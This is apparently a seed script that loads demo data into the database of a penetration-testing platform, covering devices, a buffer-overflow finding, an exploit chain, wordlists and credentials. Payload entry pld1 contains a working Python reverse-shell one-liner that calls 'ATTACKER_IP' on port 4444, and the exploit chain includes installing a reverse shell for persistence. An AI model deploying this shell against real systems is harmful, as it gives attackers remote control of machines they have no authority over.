import datetime
import json
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from app.models.models import Base, Project, Device, Binary, Function, Finding, ExploitChain, Session, AIModel, Wordlist, Payload, Variant, Credential, AttackSurface, HardwareInterface, FirmwareImage, FirmwareAnalysis, RecompilationJob, PayloadSuccessRate

SQLALCHEMY_DATABASE_URL = "sqlite:///./app.db"
engine = create_engine(SQLALCHEMY_DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

def seed():
    Base.metadata.drop_all(bind=engine)
    Base.metadata.create_all(bind=engine)
    db = SessionLocal()

    # 1. Project
    p1 = Project(
        name="Operation Eagle Eye",
        description="Full-scale penetration test for Enterprise Corp's core infrastructure.",
        start_date=datetime.datetime.now(),
        status="active",
        authorized_targets=["192.168.1.0/24", "enterprise.corp", "DC-01"],
        zero_click_enabled=True
    )
    db.add(p1)
    db.commit()
    db.refresh(p1)

    # 2. Devices
    d1 = Device(project_id=p1.id, name="Edge Gateway", type="router", os="BusyBox/Linux", ip="192.168.1.1", mac="00:11:22:33:44:55", last_seen=datetime.datetime.now())
    d2 = Device(project_id=p1.id, name="Workstation-01", type="pc", os="Windows 11", ip="192.168.1.15", mac="AA:BB:CC:DD:EE:FF", last_seen=datetime.datetime.now())
    d3 = Device(project_id=p1.id, name="Database-Server", type="server", os="Ubuntu 22.04", ip="192.168.1.102", mac="11:22:33:44:55:66", last_seen=datetime.datetime.now())
    db.add_all([d1, d2, d3])
    db.commit()

    # 3. Binaries & Functions
    b1 = Binary(device_id=d1.id, path="/bin/httpd", arch="arm", file_type="ELF", size=245760, protections={"NX": True, "ASLR": False})
    db.add(b1)
    db.commit()
    db.refresh(b1)

    f1 = Function(
        binary_id=b1.id,
        name="parse_headers",
        offset="0x401200",
        size=512,
        danger_score=85,
        vuln_type="buffer_overflow",
        is_zero_click_candidate=True,
        surface_type="messaging",
        assembly_snippet="0x401200: push rbp\n0x401201: mov rbp, rsp\n0x40120b: lea rdi, [rbp-0x100]\n0x401215: call strcpy",
        python_like="def parse_headers(req):\n    buffer = bytearray(256)\n    # DANGER: No bounds check\n    strcpy(buffer, req.headers)"
    )
    db.add(f1)
    db.commit()
    db.refresh(f1)

    # 4. Findings
    fnd1 = Finding(
        function_id=f1.id,
        severity="critical",
        confidence=0.95,
        evidence="Found strcpy call on user-controlled header input at 0x401215.",
        recommendation="Replace strcpy with strncpy and validate header lengths.",
        risk_score=92
    )
    db.add(fnd1)
    db.commit()

    # 5. Exploit Chains
    ec1 = ExploitChain(
        name="Gateway to Core Pivot",
        target_device_id=d1.id,
        target_function_id=f1.id,
        steps=json.dumps([
            {"step": 1, "action": "Trigger Buffer Overflow", "description": "Send 512 bytes to httpd parse_headers"},
            {"step": 2, "action": "ROP to System", "description": "Execute /bin/sh via ROP chain bypassing NX"},
            {"step": 3, "action": "Establish Persistence", "description": "Install reverse shell in /etc/init.d/rcS"},
            {"step": 4, "action": "Lateral Pivot", "description": "Scan internal 192.168.1.0/24 subnet"}
        ]),
        result="ready"
    )
    db.add(ec1)
    db.commit()

    # 6. Sessions
    s1 = Session(device_id=d1.id, type="reverse_shell", info=json.dumps({"IP": "192.168.1.1", "User": "root"}), connected=True, last_seen=datetime.datetime.now())
    db.add(s1)
    db.commit()

    # 7. AI Models
    m1 = AIModel(name="Gemini-1.5-Pro", model_type="LLM", enabled=True, base_url="https://generativelanguage.googleapis.com/")
    m2 = AIModel(name="GPT-4o", model_type="LLM", enabled=True)
    db.add_all([m1, m2])
    db.commit()

    # 8. Wordlists
    w1 = Wordlist(name="IOT_Common_Passwords", content="admin\npassword\n123456\nguest\nroot\n1234", category="passwords", is_ai_generated=False, project_id=p1.id)
    w2 = Wordlist(name="Enterprise_AI_Pattern", content="corp2024!\nEagleEye123\nAdmin@Enterprise\nWinter2024", category="passwords", is_ai_generated=True, project_id=p1.id)
    db.add_all([w1, w2])
    db.commit()

    # 9. Payloads
    pld1 = Payload(name="Linux Reverse Shell (ARM)", type="reverse_shell", base_code="import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')", is_template=True)
    db.add(pld1)
    db.commit()

    # 10. Credentials
    c1 = Credential(device_id=d1.id, username="admin", password="password123", type="web", origin="Bruteforce")
    db.add(c1)
    db.commit()

    # 11. Attack Surface
    as1 = AttackSurface(project_id=p1.id, ip="192.168.1.1", port=80, protocol="tcp", service="httpd", version="BusyBox httpd 1.34.1")
    as2 = AttackSurface(project_id=p1.id, ip="192.168.1.1", port=22, protocol="tcp", service="sshd", version="OpenSSH 8.9")
    db.add_all([as1, as2])
    db.commit()

    # 12. Hardware Interfaces
    hi1 = HardwareInterface(device_id=d1.id, type="UART", pins={"TX": 1, "RX": 2, "GND": 3}, voltage=3.3, baud_rate=115200)
    hi2 = HardwareInterface(device_id=d1.id, type="JTAG", pins={"TDI": 8, "TDO": 9, "TCK": 10, "TMS": 11}, voltage=3.3)
    db.add_all([hi1, hi2])
    db.commit()

    # 13. Firmware Images
    fi1 = FirmwareImage(device_id=d1.id, binary_id=b1.id, version="1.34.1", file_path="/storage/firmware/eagle_eye_v1.bin", hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", size=16777216)
    db.add(fi1)
    db.commit()

    # 14. Payload Success Rates
    psr1 = PayloadSuccessRate(payload_id=pld1.id, arch="arm", os="linux", success_count=12, fail_count=2, crash_count=1)
    db.add(psr1)
    db.commit()

    db.close()
    print("Demo data seeded successfully.")

if __name__ == "__main__":
    seed()
